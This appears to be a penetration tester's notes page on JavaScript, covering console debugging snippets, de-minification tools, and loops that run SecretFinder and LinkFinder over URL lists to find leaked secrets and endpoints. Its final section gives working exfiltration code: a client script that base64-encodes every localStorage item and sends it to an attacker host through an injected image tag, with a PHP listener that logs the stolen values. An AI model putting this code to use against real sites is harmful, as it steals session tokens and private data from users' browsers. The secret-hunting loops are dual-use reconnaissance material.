# All Stuff JS
## Debugging
To list all currently loaded JavaScript variables in the browsers console:   
```
for(var b in window) {
if(window.hasOwnProperty(b)) console.log(b);
}
```
Another method with more output:   
```
var n, arg, name;
console.log("typeof this = " + typeof this);
for (name in this) {
    console.log("this[" + name + "]=" + this[name]);
}
for (n = 0; n < arguments.length; ++n) {
    arg = arguments[n];
    console.log("typeof arguments[" + n + "] = " + typeof arg);
    for (name in arg) {
        console.log("arguments[" + n + "][" + name + "]=" + arg[name]);
    }
}
```
## Un-Minify JS code
Tool: https://github.com/jehna/humanify   
Blog: https://thejunkland.com/blog/using-llms-to-reverse-javascript-minification   

## Searching for low hanging fruits
### TODO: Test JSLuice
https://github.com/BishopFox/jsluice

### Secretfinder
`$ for url in $(cat /root/Desktop/urls_js.txt); do python3 SecretFinder.py -i $url -o cli; done`   
Using a proxy:   
`$ for url in $(cat /home/kali/Desktop/urls_js.txt); do python3 SecretFinder.py -i $url -p http://localhost:8080 -o cli; done`    

### Linkfinder
`# for url in $(cat /root/Desktop/urls_js.txt); do python3 linkfinder.py -i $url -o cli; done`   
Note: If you get SSL deprecation errors, run it with: `python3 -W ignore linkfinder.py`   

## Sending Local Storage Items to Remote Server
### JavaScript (client) 
```
newString = "";
for (var a in localStorage) {
    newString += a + "="
    newString += localStorage[a];
    // Encode the String with base64
    var encodedString = btoa(unescape(encodeURIComponent(newString)))
    document.write('<img src="https://10.10.10.10/attackerswebapp/receiver.php?str='+encodedString+'">');
    newString = "";
}
```
### PHP listener (server)
```
<?php
$encodedstr = $_GET["str"];
$file = fopen('log.txt', 'a');
$string = base64_decode($encodedstr);
fwrite($file, $string . "\n\n");
?>
```
